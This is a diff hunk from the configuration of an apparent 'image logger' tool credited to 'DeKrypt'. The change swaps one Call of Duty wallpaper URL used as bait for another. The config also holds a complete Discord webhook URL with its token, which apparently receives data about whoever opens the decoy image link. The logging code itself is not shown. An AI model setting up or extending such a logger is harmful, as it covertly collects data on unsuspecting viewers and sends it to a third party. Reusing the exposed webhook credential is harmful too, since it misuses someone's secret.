@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1499452990346498179/3GI5P4I4F7RxlWRqG_sbKoKb3Cnm5sp2amlMR2Ul1wvJmD0Q25sg3aZL8OSFthbl9yK9",
-    "image": "https://wallpapercat.com/w/full/3/0/e/6263-1920x1200-desktop-hd-call-of-duty-wallpaper-photo.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://wallpapers.com/images/featured/call-of-duty-pictures-7lrqnchbx478ucgg.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
